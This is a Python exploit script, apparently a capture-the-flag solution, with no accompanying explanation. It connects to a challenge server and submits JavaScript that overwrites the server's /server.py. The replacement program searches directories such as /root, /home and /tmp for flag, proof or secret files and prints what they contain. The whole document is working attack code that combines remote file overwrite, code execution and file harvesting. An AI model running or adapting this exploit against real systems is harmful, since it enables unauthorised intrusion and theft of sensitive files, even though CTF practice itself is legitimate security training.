import socket

HOST, PORT = 'ctf.vulnbydefault.com', 38871

new_server = '''#!/usr/bin/env python3
import os
print("PWNED_SERVER", flush=True)
roots = ["/root", "/home", "/opt", "/srv", "/tmp", "/run", "/"]
seen = 0
for base in roots:
    if not os.path.exists(base):
        continue
    for root, dirs, files in os.walk(base):
        for name in files:
            lname = name.lower()
            if "flag" in lname or lname in {"proof.txt", "secret.txt"}:
                path = os.path.join(root, name)
                try:
                    with open(path, "rb") as f:
                        data = f.read(1024)
                    print("CAND", path, flush=True)
                    try:
                        print(data.decode("utf-8", "ignore"), flush=True)
                    except Exception:
                        print(repr(data), flush=True)
                    seen += 1
                    sig = data.lower()
                    if b"flag{" in sig or b"ctf{" in sig or b"vbd" in sig:
                        print("DONE", flush=True)
                        raise SystemExit(0)
                except Exception:
                    pass
print("TOTAL", seen, flush=True)
'''

js = "writeFile('/server.py', " + repr(new_server) + ");\nprint('OVERWRITTEN');\n"

s = socket.create_connection((HOST, PORT), timeout=15)
s.recv(4096)
s.sendall((str(len(js)) + "\n").encode())
s.recv(4096)
s.sendall(js.encode())
s.shutdown(socket.SHUT_WR)
out = b''
while True:
    d = s.recv(65536)
    if not d:
        break
    out += d
print(out.decode('latin1', errors='replace'))
